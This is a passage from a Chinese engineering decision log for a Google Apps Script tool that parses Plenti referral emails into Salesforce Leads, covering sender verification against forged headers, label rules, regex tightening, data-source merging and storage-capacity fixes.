| `unique=false` | ⚠️⚠️ **规格 §5.4 第三层去重失去数据库兜底。** 查询与创建之间存在竞态窗口,而跨项目又无法原子去重(§5.5) |
| `unique` 但 `caseSensitive=false` | ⚠️ delivery token 是 base64,**只差大小写的两个 token 会被当成同一个**,第二条转介被静默跳过 |
| `externalId=false` | ⓘ 任务 B 的 upsert 无法使用 |

为此 `plLeadFieldMap_` 的缓存从"字段名 → 是否可写"的布尔表改成存完整属性对象
(`createable` / `unique` / `caseSensitive` / `externalId` / `type` / `length`)。
运行期的存在性判断仍然只看 `createable`,行为不变,有断言。

### L-01 自动放行:上线前不改,Phase 4 一起做

Jack 认同四个限定条件,并特别认同第 ① 条 —— 锁里存了 `{state, id}`,
现在代码只看键存不存在。`state==='created'` 时应该**用记录下的 id 去取 Lead**,
而不是重建。留到 Phase 4 清理临时开关时一起做。

---

## D-027 Q10 收窄:标签只留给带 Plenti 链接的邮件 · Q10 关闭

**日期** 2026-09-10 · **决定人** Jack · **阶段** R15,已实现

### 判据

**邮件里有没有 Plenti browser-view 链接** —— 一个结构事实,与噪音量无关,
所以不需要"先跑几天看数据"。

| 情形 | 行为 |
|---|---|
| 不可信 + **无**链接 | 落 review 状态、进 Messages 表,**不打标签** |
| 不可信 + **有**链接 | 打标签,而且显眼 |

Jack 补的时间理由:**收益在进组那一刻兑现,没有"先跑几天"的余地** ——
跑几天的代价就是 `SF-Lead-Review` 挂满非 Plenti 业务邮件,真正的 lead 被淹掉,
标签直接废掉。

### 转发件走的不是不可信分支

实现时发现的关键一点:**手动转发的邮件被 `plExclude_` 提前拦下,根本到不了
不可信分支。** 转发件没有 `X-Original-Sender`,`plExclude_` 的空发件人规则
先返回了 —— R9 的日志正是 `Sender could not be determined`。

所以收窄必须覆盖**两个入口**:

1. `plExclude_` 的空发件人分支(转发件走这条)
2. `isPlentiSource_` 验证不通过

两者的可见性判定完全相同,合并到 `plUnverifiedReview_` 一处。
`plExclude_` 只多打一个 `unverified` 标记,**仍然绝不判 internal、仍然落
review** —— Jack 当初立的那条硬要求没有松动,只是"打不打标签"改由链接决定,
有断言逐条锁住。

### 转发件的区分

Jack 的想法是"看转发链里有没有内部域的地址",实现用 **`From` 在
`INTERNAL_DOMAIN` 上**。三类:

| scope | 含义 | 标签 |
|---|---|---|
| `out-of-scope` | 普通业务邮件 | 不打 |
| `forwarded` | 同事手动转发的 Plenti 邮件 | 打 |
| `unverified-with-link` | 带链接但发件人无法验证 —— 漏单或伪造 | 打,显眼 |

**`From` 是发信人可控的,能伪造。** 所以这个区分**只用来改 reason 的措辞,
绝不用来降低可见性** —— 两类的 `leadCandidate` 都是 `true`,标签照打。
reason 里也明写了 From can be forged, so this wording is a hint, not a verdict。

有一条断言专门验证:伪造 `From` 为内部地址 + 认证失败 + 带链接,标签仍然亮。
域名匹配复用 D-009 的边界规则,`notexample.org` 不会被当成内部域。

### 判据只看链接存在,绝不发起抓取

对未验证的邮件**只做正则存在性检查,不 fetch**。有断言:未验证邮件走完整流程
时,网络桩一次都不能被调用。

### 连带:Messages 表的备注列现在 review 也写 reason

收窄之后,不打标签的邮件**只能靠 Messages 表被看见**。原先备注列只在 error
时写 reason,review 时是空的 —— 那等于让人对着一行 review 猜。
这是 `Code.gs` 本轮唯一的改动。

### 不违反"绝不静默丢弃"

- 状态照常存进 Script Properties(有断言验证)
- 消息照常在 Messages 表里留一整行,含完整正文和 reason
- 设计里本来就有先例:`plExclude_` 判出的测试邮件、Web-to-Lead 失败同样是
  "review 状态但无标签"

变的是**可见面**从 Gmail 标签移到 Messages 表,不是可见性本身。

### 一个边界:可信但认不出的邮件仍然打标签

三个 `trusted-*` fixture 通过了发件人验证,走的是判定门那条路,**不受本次收窄
影响**。可信 Plenti 发来一封我们认不出的邮件(可能是新模板),恰恰值得人看一眼。

---

## D-028 `status=0` 不是超时;以及降级 Lead 永不重试这个缺口

**日期** 2026-09-10 · **阶段** R16

### ① `status=0` 的真相:那一轮**根本没跑**

现象:同一封邮件连跑两次,不带 force 时 `ok=false status=0`,带 force 时
`ok=true status=200`。agent 猜是 customer.io 偶发超时。

**不是超时。** `plProcess_` 开头就短路了:

```javascript
if(prior&&!force&&prior.state!=='error')return prior;
```

短路时 `detail` 出参从未被填,R9 的诊断行读的是
`(detail.parsed&&detail.parsed.browserView)||{}` —— 一个空对象。
于是 `ok` 是 `undefined`→打成 false,`view.status||0`→打成 0,
`view.found` 不存在→打成 `(none)`。

**"字段值仍然正确写入"也解释得通**:那些值是**上一轮**写的。
`plTestVerifyLead_` 回读的是 Salesforce 里既有的 Lead,和这一轮做没做事无关。

#### 三种情况的判别式(已在模拟中逐一复现)

| 情况 | 日志特征 |
|---|---|
| 抓取成功 | `ok=true status=200 degraded=false fields=name,address,systems` |
| **短路(没跑)** | `degraded=false` **且没有 `error=`** |
| **真正的网络失败** | `degraded=true` **且带 `error=connection timed out`** |

**关键判别位是 `degraded` 和有没有 `error=`,不是 `status`。**
真失败一定会把 `degraded` 置为 true 并记下原因;短路两者都没有。

#### 诊断已修正

R9 的输出以前把两者印成同一行,把人引向了错误结论。现在短路时明说:

```
[R9] ⏭️ NOT RE-PROCESSED — this message already has a stored state,
     so plProcess_ returned it unchanged.
[R9] ⏭️ Nothing was parsed and no page was fetched this run.
     The values below come from the earlier run. Pass force=true to actually re-run.
```

**顺带修掉一个记账错误**:`createdNow` 是**持久化**在状态里的,短路后照样读得到。
R9 入口原先直接拿它算 `stats.created` 写进 Sheet —— 同一条 Lead 会被重复记进
月度对账(和 D-026 拆分 `created`/`createdNow` 是同一类坑)。现在短路时
`processed` 和 `created` 都记 0,有断言。

`runIntakeV2` 的主循环**没有**这个问题:它的 `if(!old||old.state==='error')`
守卫让短路的消息根本到不了计数那一步。

### ② 生产上的偶发抓取失败:Lead 照建,但**永远不会补齐**

**建 Lead 有保证。** delivery token 取自 URL 本身、不依赖抓取结果,所以
`kind='referral'` 和 `referralId` 在抓取失败时仍然成立,判定门照过
(D-019 的"身份与数据分开对待")。已有断言:

> `a failed fetch must NOT stop the Lead from being created — the SLA clock is running`

模拟里也验证过:注入 `connection timed out`,Lead 照样建出来,
Description 带 `[BROWSER VIEW UNAVAILABLE]`。**网络抖动不会漏单。**

#### ⚠️ 但有一个缺口:降级的 Lead 不会被自动补齐

抓取失败建出的 Lead 没有客户姓名(用 `Plenti referral <token>` 兜底)、
没有地址、没有 systems。而**下一轮扫描不会再试**:

- `plProcess_` 见 `prior.state==='review'` 就短路
- `ivRefreshOutstanding_` 确实每轮都会访问这条状态,但只调 `plRefreshReview_`,
  而它只查联系方式,不重新抓取

**结果:一次一秒钟的网络抖动 = 这条 Lead 永久缺姓名和地址**,除非有人手动
force 重跑。页面一分钟后就恢复可用了,我们却不会再去看一眼。

#### 影响评估

按 D-024,每条 Plenti 线索本来就必须有人去 Portal 取联系方式,那时姓名也能
一并看到 —— 所以**不影响 SLA,不漏单**,是数据质量问题。

但 `Plenti_Browser_View_HTML__c` 会是空的,那是**审计留底**(D-014);
`Plenti_Systems__c` 也会缺,而它是 Schedule 3 季度报告可能要按之切分的字段。

#### 建议的修法(未实施,等 Jack 决定)

钩子是现成的:`ivRefreshOutstanding_` 每轮已经在访问这些状态了。
让 `plRefreshReview_` 在发现 `state.browserView.degraded===true` 时重试一次
抓取,成功就补写字段并清掉降级标记。

成本:每轮对降级状态多一次 fetch(数量应该很少)。
需要加退避,避免页面永久失效(链接过期)时每轮都白抓 —— 例如记重试次数,
超过若干次就停并把 reason 改成"需要人工打开链接"。

### ③ `src/script.gs` 纳入仓库

`describeIt()` / `runIt()` 两个无参包装函数。Apps Script 编辑器的 Run 下拉框
只列**无参数**的顶层函数,`plTestFromMessageId` 需要一个消息 ID,直接点不了。

以前它只存在于线上、不在仓库里,所以每次 `clasp push` 都被覆盖掉,
agent 重建了三次。纳入 `src/` 之后 push 会带上它。

⚠️ 里面写死了一个测试邮件的 Gmail 消息 ID —— 这是临时测试脚手架,不是主流程
配置;主流程的环境值仍然一律走 Script Properties。

离线测试现在也加载 `script.gs` 并纳入静态守卫与 ES5 检查,
**语法错误会在推上去之前就被抓到**。

### 🔴 删除清单补充(与 D-017 / D-020 / D-021 一起执行)

| 文件 | 删什么 |
|---|---|
| **`src/script.gs`** | **整个文件删除** |
| `test/offline.cjs` | 加载列表、静态守卫文件列表里的 `'script.gs'` |
| `src/PlentiTests.gs` | `testPlentiTestEntryPoint` 里"不带 force 重跑"那一段 |

---

## D-029 两个数据源、Customer phone、LeadSource 读属性

**日期** 2026-09-11 · **决定人** Jack(方式由我判断) · **阶段** R17,已实现

### 背景

2026-09-10 收到第一封**正式** lead(真实客户,具体值不入库)。两处变化:

1. **邮件正文里有数据了**,不再是空的
2. **多了一个字段 `Customer phone`**

之前那封 Gabby TEST 正文全空、systems 显示 `[]`,Jack 判断那是一条坏掉的测试数据。

⚠️ **这一点我没法从这里确认,有一个替代解释值得查一下**:`[]` 恰好是模板
**第二区块**(空值区块)的占位符。所以 Gabby 那封邮件的 HTML 里,第一区块
可能是有数据的,只是 Gmail **显示**出来的是空的那一块。一个查询就能定:
在那条 Lead 的 `Plenti_Raw_Email__c` 里搜 `Gabby TEST`。
另一个变量是那封是**转发件**,Gmail 转发时可能改写了 HTML。

### ① Customer phone

**解析**:在标签表里加一行即可。配对算法对每个标签独立扫描、撞到下一个标签
就停,双区块陷阱自动适用,不需要改算法。fixture 两个区块都加了 phone,
有断言验证取到的是第一区块的真值、不是第二区块的空值。

**写进哪个字段 —— 按号段分流**:

| 号码 | 字段 |
|---|---|
| `04` 开头(含 `+61 4`) | `MobilePhone` |
| 其他 | `Phone` |

澳洲编号规划是固定的,这不是猜。手机号放进 `MobilePhone` 语义才对 ——
SMS、点击发短信这类集成都认这个字段;反过来把座机塞进 `MobilePhone` 就是错的。

⚠️ 如果跟进人的 Lead 布局上没有 `MobilePhone`,需要加上。

**要不要规范化 —— 同意 Jack,原样存。** 规范化只在**比较**时做(去掉非数字、
把 `+61` 折回 `0`),**从不写入 Salesforce**。原始值另在 `Plenti_Parsed_JSON__c`
里留底。

### ② 两个数据源的取舍

**两边都解析,逐字段合并** —— 采纳 Jack 的倾向。

邮件 HTML 与 browser view 是**同一个 Customer.io 模板**的两份渲染,所以
**用同一个解析器**,双区块处理两边都适用。刻意**不**解析 `getPlainBody()` ——
那是 Gmail 转出来的文本,格式没见过,写规则是猜(D-018 同一条理由)。

⚠️ 这个"同一模板"是基于 browser view 就是 Customer.io 托管的同一封邮件这一点
推出来的,**还没有用真实邮件的 HTML 验证过**。所以每个字段都记下了来源
(`browserView.sources`),第一次真实运行就能看出邮件那一侧到底解析到了没有。

#### Jack 的三个问题

**1. 冲突时以哪边为准?—— 以邮件为准。**

| 情况 | 结果 |
|---|---|
| 只有一边有值 | 取那一边,记录来源 |
| 两边都有且一致(格式不同也算) | 取值,来源记 `both` |
| 两边都有且冲突 | **取邮件的值**,记入 `conflicts`,写进 reason 和 Description |

理由:邮件是**我们在 T0 实际收到的那一份**,落在 `Plenti_Raw_Email__c`,是审计
原件;它不受网络影响;页面是事后另外抓的。页面在这里的角色是**独立交叉核对** ——
价值在于**发现**不一致,不是在不一致时替邮件做决定。

**冲突不阻断建 Lead**,SLA 时钟不等人。Description 里会带
`[SOURCES DISAGREE: phone — email value used, please check]`。

**2. 邮件解析成功还要不要抓 browser view?—— 要,永远抓。**

两个理由都不依赖邮件解析得多完整:页面 HTML 是审计留底(D-014),不能省;
它也是发现"两边不一致"的**唯一**交叉核对。成本是每条新 Lead 一次 HTTP 请求。

**3. 会不会让 R8 的降级逻辑变复杂?—— 不会更复杂,但语义拆开了。**

以前"降级"是一根轴:抓取失败 = 没数据。现在是**两根独立的轴**:

| 标记 | 含义 | Description |
|---|---|---|
| `degraded` | **数据**缺失:两个来源都没给出客户姓名 | `[CUSTOMER DETAILS MISSING …]` |
| `auditMissing` | **审计留底**缺失:页面没抓到 | `[AUDIT COPY MISSING …]` |

**邮件解析成功而页面抓取失败时,只丢审计留底、不丢数据** —— 比以前温和得多。
两种标记可以同时出现;数据缺失时不重复标审计缺失。

这也让 D-028 那个"降级 Lead 永不重试"的缺口**影响变小了**:现在抓取失败
多数情况下只缺审计 HTML,客户数据从邮件里已经拿到了。

### ⚠️ ③ 这次改动打破了 D-024 的前提

D-024 的解除信号是"`Email`/`Phone`/`MobilePhone` 任一非空",理由是
**"Plenti 一条联系方式都不给,所以非空只可能是人填的"**。

**这个前提现在不成立了** —— Plenti 给了电话。照旧的话,**我们自己写进去的电话
会在下一轮扫描就让 review 解除**,而且 reason 会谎称"是人填的"。

**已修正**:建 Lead 时记下我们写入的联系方式的**指纹**(`state.supplied`),
`plReviewClearedReason_` 只把**不是我们写的**值算作人为动作:

| Lead 上的变化 | review |
|---|---|
| 我们写的那个电话,原样 | 不解除 |
| 同一个号码,换了格式 | 不解除 |
| 人改了电话 | **解除** |
| 人补了邮箱 | **解除** |
| 转换 / Unqualified | **解除**(同 D-024) |

存的是**哈希不是号码** —— 状态落在 Script Properties 里,不值得为了一次比较
多放一份客户电话的明文副本。`supplied` 按每次的解析结果重算,force 重跑也不会丢。

**需要 Jack 决定的**:这样实现之后,一条有电话的 Plenti Lead 会**一直**挂着
Review,直到人补邮箱、改电话、转换或判不合格。另一种合理的定义是
**"有电话就算可联系,Review 就该熄"**。两种都说得通,取决于 Review 在你们的
工作流里到底表示"还没人管"还是"还联系不上"。当前实现是前者。

### ④ LeadSource 从 Script Property 读

**触发**:生产上 Lily 加的 picklist 值是 `Plenti Referrals`,代码里写死的是
`Plenti`。沙箱和生产不一定一样,写死迟早出事。

新属性 `PLENTI_LEAD_SOURCE`,**缺失即抛错**(规格 §3 禁止 #2)。

两道保护:

1. **在写 `IV2_CREATE_` 锁之前校验**:对照 org 的活跃 picklist 值,不在里面就抛错。
   所以配错的值**不会先 POST 失败、再把锁卡在 `requested` 触发 L-01**。
   这一步放在 `plCreateLead_` 里而不是 `plLeadPayload_` 里 —— 字段自检的探针也
   调 `plLeadPayload_`,**自检工具不能在配错时自己崩掉**,它的用处恰恰是把配错报出来。
2. **`plTestDescribeLead()` 报出这个值是否有效**,并在无效时列出所有活跃值。

describe 失败(拿不到 picklist)时不阻断,照配置的值写 —— 与可选字段探测同一策略。

---

## D-030 第一封真实组投递邮件:四项确认、一个 bug、一个设计缺口

**日期** 2026-09-11 · **阶段** R18

进组后收到第一封经 Google Groups 投递的真实 Plenti 邮件(WA Battery Scheme,
不是 referral),身份相关的头都在。**这是 §5.1 可信验证第一次拿到真实输入。**

### 四项确认

| # | 结论 |
|---|---|
| 1 | `dmarc=pass (p=REJECT sp=REJECT dis=NONE)`,Plenti 是严格拒绝策略。用真实头跑 `isPlentiSource_`:`dmarc=pass` 命中;`header.from` 提取到 `plenti.com.au`,**不会误取 dkim 段里的 `header.i`**;与 `X-Original-Sender` 域名对齐。D-009 的严格版判定现在有真实依据了 |
| 2 | 代码**只读** `X-Original-Authentication-Results`(Plenti.gs:249),全仓库没有任何地方读顶层的 `Authentication-Results`。对照:顶层那个 `dmarc=fail header.from=sunterra.com.au`,取错了就每封都判不可信 |
| 3 | 代码**没有任何地方**直接读或比对 `List-ID` 的值。唯一相关的是 Gmail 的 `list:` 搜索操作符 —— ⚠️ 见下 |
| 4 | `X-Original-From` 未使用,记着 |

#### ⚠️ `list:` 操作符是今天唯一还没验证的环节

`runIntakeV2` 的查询是 `list:edocs@sunterra.com.au`,而 `List-ID` 的值是
`<edocs.sunterra.com.au>`(点号)。**我不确定 Gmail 会把 `@` 形式映射到点号形式。**
如果不匹配,`runIntakeV2` 一封信都搜不到 —— 比任何身份问题都靠前。

**验证只要 10 秒**:在 Gmail 搜索框里分别搜 `list:edocs@sunterra.com.au`
和 `list:edocs.sunterra.com.au`,看 WA 那封出不出来。规格 §5.7 早就把这一项
标为"待样本验证"。

### 🐛 Bug:组投递的邮件被误判成"同事转发"(已修复)

**D-027 的转发判据是"`From` 在内部域上"。真实头证明它是错的:**

```
From: "'Plenti - Western Australia Battery Scheme' via Sunterra E-Documents" <edocs@sunterra.com.au>
```

发件域设了 DMARC `p=REJECT` 时,**Google Groups 会把 `From` 改写成组地址** ——
而组地址就在内部域上。所以每一封"经组投递、发件人不在可信清单、带 Plenti 链接"
的邮件,都会被标成:

> FORWARDED BY A COLLEAGUE (edocs@sunterra.com.au): ... the Google Groups headers are missing because it was forwarded ...

**两处都是错的**:不是同事转发,而且组投递的头明明都在。

**修复**:真正的区分是**投递方式** —— 组投递带 `X-Original-Sender`,手动转发不带。
`forwarded` 现在要求 `X-Original-Sender` **不存在**。组投递的邮件 `From` 没有信息量,不看。
有回归断言复现了真实的改写后 `From`。

标签不受影响(两类都打标签),错的只是措辞 —— 但措辞错得正好会让人放松警惕。

### 措辞按失败原因拆开,并报出发件地址

`isPlentiSource_` **先查清单(第 2 步)再查认证(第 3、4 步)**。所以"不在清单"时
认证状态根本没被评估,**不能说它"可能是冒充"** —— WA 那封 DMARC 完全通过,
只是地址不在清单里。现在四类:

| scope | 情形 | 标签 |
|---|---|---|
| `out-of-scope` | 没有 Plenti 链接 | 不打 |
| `forwarded` | 手动转发(没有 `X-Original-Sender`) | 打 |
| `unlisted-sender-with-link` | 经组投递,**发件人不在清单**,认证未评估 | 打 |
| `unverified-with-link` | 发件人**在清单里但认证失败** —— 真正的伪造信号 | 打,显眼 |

**`unlisted-sender-with-link` 的 reason 会原样打出发件地址:**

> ⚠️ SENDER NOT IN TRUSTED LIST: `<地址>` sent a message carrying a Plenti browser-view link. If this is a referral, add `<地址>` to PLENTI_TRUSTED_SENDERS ...

这直接解决"要等下一封真实 referral 才能拿到准确地址"—— **第一封真 referral 在它的
地址被加进清单之前就会落在这里,系统自己告诉你该加什么。**

### ⚠️ 设计缺口:"带 Plenti 链接" ≠ "是 referral"

D-019 的判定门是"拿到 delivery token 就是 referral",D-027 的收窄判据是"带 Plenti
链接就打标签"。**两者都默认了只有 referral 邮件才带 Customer.io 的 browser-view 链接。**

Plenti 至少有两条业务线往 eDocs 发信。**如果 WA Battery Scheme 的邮件也是经
Customer.io 发的(很可能),它也会带同样形态的链接。** 模拟结果:

| 情况 | 结果 |
|---|---|
| A. WA 邮件**无** Customer.io 链接 | `out-of-scope`,不打标签 ✅ 符合预期 |
| B. WA 邮件**有**链接,清单只含 referral 地址 | `unlisted-sender-with-link`,**打标签** —— Q10 想挡掉的噪音挡不住 |
| C. 清单误填整个 `@plenti.com.au` | ⚠️ **建出一条垃圾 Lead**(DEGRADED,无客户姓名) |

**C 证实了 Jack 的判断,而且比预期更严重**:不只是"被当成可信来源",而是会
**真的建 Lead** —— 因为判定门只看 token。所以 `PLENTI_TRUSTED_SENDERS` 必须是
**精确的 referral 发信地址**,不能填整个域。这一点现在是硬性要求,不只是建议。

**B 需要 Jack 决定。** 先查一件事就能判断它是不是真问题:在那封 WA 邮件的原文里
搜 `customeriomail.com/deliveries/`。搜不到,B 就不存在;搜得到,有两个方向:

- 收窄判据:要求"带链接**且**正文里有 referral 模板的字段标签"(例如 `Customer name`)
  才打标签。代价:认证失败 **且** 邮件正文为空的真 referral(双重故障)会只进
  Messages 表、不打标签
- 或按主题收窄(`Action required: New lead`)。主题可伪造,但这里只影响打不打标签、
  不影响建不建 Lead

两种都**只影响未验证邮件的标签**,不碰判定门,所以不会让任何可信 referral 漏建。

---

## D-031 入组首日的实测事实;链接主机收紧;标签方案降级

**日期** 2026-09-11 · **阶段** 入组首日

### 实测事实(只读核查,未改动邮箱任何状态)

**① `list:` 两种写法等价。** `list:edocs@sunterra.com.au` 与 `list:edocs.sunterra.com.au`
都返回 34 个会话。代码现用的 `@` 写法能搜到组投递邮件,不用改。

**② Plenti 用四个地址往 eDocs 发信,只有 referral 带 browser-view 链接。**
每类各查了一封原文:

| X-Original-Sender | 业务 | 发信系统 | `/deliveries/` 链接 | `Customer name` 字段 |
|---|---|---|:--:|:--:|
| **`renewables-referrals@plenti.com.au`** | **referral** | Customer.io | ✅ | ✅ |
| `wabatteryscheme@plenti.com.au` | WA 返利工单回复 | Zoho Desk → Mailgun | ❌ | ❌ |
| `contact@plenti.com.au` | WA 返利状态通知 | — | ❌ | ❌ |
| `noreply.greenfinance@plenti.com.au` | 贷款审批结果 | — | ❌ | ❌ |

四个都是 `dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=plenti.com.au`。

**`PLENTI_TRUSTED_SENDERS` 填 `renewables-referrals@plenti.com.au`,只填这一个。**
之前从正文联系方式里推测的地址,就是真实发信地址。
D-030 担心的"其他业务线带链接被误打标签",在今天的样本里**不存在**。

**③ D-029 的"同一模板"假设已用真实邮件验证。** 把 `plParseBrowserView_` 的配对
算法原样放到真实 referral 邮件的 HTML 上跑:四个标签各出现两次(双区块),
四个值**全部走主路径、取自右对齐段落**;地址拆分与电话分流都正确。

**④ ⚠️ Gmail 把所有 referral 合进同一个会话。** 标题相同(`Action required: New lead`)
且 `From` 都被组改写成同一个组地址,两封真实 referral 落进了一个会话。
**Gmail 标签是按会话打的,不是按封。**

**⑤ 噪音量**:入组后约 2 小时 32 个会话(约 37 封),referral 1 个会话(2 封),
占 3%。其余是电网并网审批、电气安全证书、Synergy、Plenti 其他业务线等。
**Q10 的收窄是必要的** —— 不收窄的话 31 个会话会被挂上 Review。

### 链接主机收紧(已实现)

同一封真实 referral 里有两个形态的链接,token 相同、主机不同:

| 部分 | 链接 |
|---|---|
| HTML 版 | `https://e.customeriomail.com/deliveries/<token>` —— 直达 browser view |
| 纯文本版 | `https://track.customer.io/deliveries/<token>` —— **点击跟踪跳转域名** |

**抓 `track.customer.io` 很可能在 Plenti 的 Customer.io 后台记一次"客户点击"** ——
我们会在别人的营销数据里伪造客户行为。以前的代码是**碰巧**避开的:正则匹配不上
那个主机名,而 `plBrowserViewUrl_` 先查纯文本、落空后才转去 HTML。

现在:

- 正则只认 **`https://e.customeriomail.com/deliveries/`**,一个字符都不放宽
- 顺带堵上旧正则的两个口子:**没有域名边界**(`evilcustomeriomail.com` 也能匹配,
  与 D-009 修过的是同一类 bug),以及任意子域名 / `http://` 都能匹配
- **抓取不再跟随跳转**(`followRedirects:false`)。实测直达链接 0 次跳转;若哪天它
  开始 3xx,很可能是跳向跟踪域名 —— 不能在这一层又从后门放进来。3xx 当作抓取失败:
  R17 之后数据已能从邮件正文拿到,只丢审计留底、不丢 Lead
- 两道守卫都做了反向验证:把正则放宽成能匹配跟踪域名、或改回跟随跳转,套件都会变红

代价:若 Plenti 换 Customer.io 区域(主机名不同),会一个都匹配不上 → 不建 Lead、
落 review。这是**可见的**失败,比静默地去抓跟踪域名好。

真实 token 是 URL 安全的 base64,带 `-`。正则和 `Plenti_Lead_ID__c` 都能处理。

### ✅ L-04 Script Properties 约 6 个工作日写满 —— 已由 D-032 解除(2026-09-11)

**由今天的噪音量数据推出来的,不是标签问题,但比标签问题急。**

每一封通过收件人白名单的邮件都会写一条 `IV2_MSG_*` 状态 —— **包括不打标签的
out-of-scope 噪音**。Q10 收窄只省掉了标签,没省掉状态。实测一条噪音状态 454 字节:

```
约 18 封/小时 × 10 个工作小时 ≈ 176 封/天 × 454 字节 ≈ 78 KB/天
Script Properties 上限 500 KB → 约 6.4 个工作日写满
```

写满之后 `setProperty` 抛错 → 每封邮件都落 `error` → watermark 冻结 →
**整条管道停摆,包括 referral。** 规格 §9 早就把 500KB 列为已知限制,但当时的
假设是"长期运行"—— 按实际噪音量,是**一周之内**。

~~建议的修法(未实施,见下方待决项)。~~ 已实施,见 D-032:正常运行稳定在约 35 KB;watermark 被 error 冻结时约 26 个工作日写满(原 6.4 天)。其他状态的长期累积见 Q19。

### 标签方案降级 —— 分析与待决项

Jack 的判断:**标签对 referral 作废,工作队列改用 Salesforce List View**
(筛 LeadSource + 状态,按 `Plenti_Received_At__c` 排序);标签保留,角色降为
"这个会话里有东西要看"。

**判断成立**,补三处影响:

1. **与 referral 同标题的可疑邮件也会合进 referral 会话。** 组投递的 `From` 全被
   改写成同一个组地址,所以一封冒充 referral、或 Plenti 换了发信地址后的
   `unlisted-sender-with-link` 邮件,只要标题还是 `Action required: New lead`,
   就会合进那个会话 —— **而那个会话的 Review 标签本来就一直亮着,最该响的警报被
   淹没了。**"可疑邮件各自独立会话"只在标题不同时成立。
2. **合并会话让轮询成本随 referral 数线性增长。** `runIntakeV2` 对搜到的会话遍历
   **所有**消息(只按上线时间过滤,不按扫描窗口),每条"已建 Lead 且仍在 review"
   的消息都会触发一次 SOQL。所有 referral 都在一个会话里、且都停在 review,
   每轮扫描就要查 N 次,N 随上线天数增长。
3. **生产上 `Plenti_Received_At__c` 还没建**(D-023),List View 在生产暂时只能按
   `CreatedDate` 排,而那恰恰是规格 §5.3 说不能用来算 SLA 的字段。

---

## D-032 Q17:扫描窗口对齐、out-of-scope 最小落盘、窗口外清理 · L-04 解除 · Q17 关闭

Jack 2026-09-11 批准,三步都做,授权改 `runIntakeV2`(Code.gs)。**这是开触发器的前置条件。**

### 第 3 步的安全推理有一个漏洞 —— 第 1 步正好把它堵上

Jack 的推理:"窗口外的 out-of-scope 消息不会再被扫到,删了不会导致重复处理。"
这句话最早出自我写的 Q17 描述("也不会再被扫到"),**按改动前的代码它不成立**:

- Gmail 检索按 **thread** 返回,`getMessages()` 带出 thread 里的**所有**消息。
  旧循环只挡 `INTAKE_V2_START` 之前的,不挡窗口之前的。
- 所以一条老 thread 只要来一封新邮件,里面早已滑出窗口的旧邮件就**全部回到循环里**。
  Groups 把 p=REJECT 发件人的 `From` 改写成组地址(D-030),同主题邮件并进同一个
  会话是常态 —— 例如同一个发件人的月度通讯。
- 若只做第 3 步:旧邮件状态被删 → 随 thread 回来 → 没有状态 → 当新邮件重处理 →
  **Messages 表重复写行**,状态重建,下一轮再删,循环往复。不会重复建 Lead
  (out-of-scope 没有 Plenti 链接),但留底表会被污染。

**结论:第 3 步只有和第 1 步同时上才安全。** 两步在同一个提交里,没有中间态。

另外两个必须守住的点:

1. **清理必须用本轮同一个 `lower`,不能另算 `now − 48h`。** 有 error 时 watermark
   冻结,`lower` 停在旧处,主循环仍在重扫 `lower` 之后的邮件。按 `now − 48h` 清,
   会删掉仍在窗口内的状态,导致每轮重处理。离线测试第 10 节专门锁这一条。
2. **绝不删:** `error`(待重试,冻结 watermark 的判断也靠它)、带 `record` 或
   `created` 的(标签与去重靠它 —— 合并的 referral 会话上的 Created 标签就靠这些)、
   `leadCandidate` 为 true 的(Review 标签靠它)、无法解析的、`date` 缺失或不可解析的。
   `date` 必须是字符串才解析:`new Date(null)` 得 1970 而不是 NaN(TODO-3 同一个坑),
   不防的话缺 `date` 的状态会被当成"很老"误删。

**残余风险(运维层面,代码防不住):** 手工回拨或删除 `INTAKE_V2_WATERMARK`,`lower`
会退回 `INTAKE_V2_START`,已清理的邮件会被重处理,**Messages 表重复写行**。不会重复
建 Lead(out-of-scope 没有链接;referral 的状态不在清理范围内,且另有 token 去重)。
已写进"运行时写入"清单。

### 为什么"lower 只会前移"成立

watermark 只在"整轮扫完且无 error"时写成本轮开始时间,单调递增。改动
`INTAKE_V2_START` 也不会让已清理的邮件回到窗口:被清理的状态日期 < 当时的
`lower`,而当时的 `lower` 必然是 `watermark − 48h`(若是 `INTAKE_V2_START`,该邮件
根本不会被处理过),新的 `lower ≥ 新 watermark − 48h ≥` 它。唯一的例外就是上面那条
手工回拨。

### 三步的实现

| 步 | 位置 | 改动 |
|---|---|---|
| 1 | `runIntakeV2` 主循环 | `date < cut` → `date < lower`。`lower ≥ cut` 恒成立,原检查被完全覆盖 |
| 2 | `plProcess_` 的不可信分支 + `ivSaveOutOfScope_` | 只存 `{state, scope, date}`,**约 75 字节**(原 454)。返回给调用方的仍是完整状态,Messages 表那一行照常带完整 reason。带链接的三类照旧完整落盘 |
| 3 | `ivPurgeOutOfScope_` / `ivPurgeable_` | 主循环之前执行(耗时计入 220 秒扫描预算);单轮最多删 200 条,剩下的下一轮接着删 |

**关于"约 50 字节":** 实际约 75。三个字段名保持与其他状态一致,现有所有读者
(`ivLeadLabelFlags_`、`ivRefreshOutstanding_`、error 扫描、幂等短路)不用改一行。
压到 50 需要只有这类状态才用的缩写字段,换来的 25 字节不值得多一套 schema。
`at` 没存 —— 全仓库没有代码读它。

### 容量(改动后)

- **正常运行:** 在册的 out-of-scope 状态 ≈ 最近 48 小时多一点的量 ≈ 350 条 × 约
  100 字节(含键名)≈ **35 KB,稳定,不再增长。**
- **watermark 被 error 冻结时:** 清理停在旧 `lower` 不前进,增长约 17.6 KB/工作日,
  从 35 KB 到 500 KB 约 **26 个工作日**(改动前正常运行就是 6.4 天)。
  ⚠️ **这只是上线初期的数字**,永久状态累积后会越来越短,见 D-034 ②。
  也就是说,一条没人处理的 error 现在有约 5 周才会拖垮管道,而不是 1 周 —— 但它仍然会,
  error 仍然必须有人处理(L-01)。
- **没解决的:** 其他 `done` 状态(internal / ignore / notice)和建出 Lead 的状态
  都不在清理范围内,仍会慢慢累积。登记为 Q19。

### 连带变化

- D-031 影响 2(轮询成本随 referral 数线性增长)**随第 1 步消失**:主循环只对窗口内
  的消息调 `plRefreshReview_`;窗口外仍在 review 的 Lead 由 `ivRefreshOutstanding_`
  轮转处理(每轮最多 10 条)—— 这条管道本来就在,没有新增。
- 旧逻辑顺带给了窗口外邮件"第二次机会"(thread 被新邮件带回时补处理)。现在没有了。
  只影响 Gmail 索引延迟超过 48 小时的邮件,可忽略。
- 离线测试第 9 节最后一轮原本依赖旧行为(2026-09-08 的 fixture 在 watermark 推到
  现在之后仍会被处理),已补删 watermark 并加断言,否则那条用例会静默空转。

---

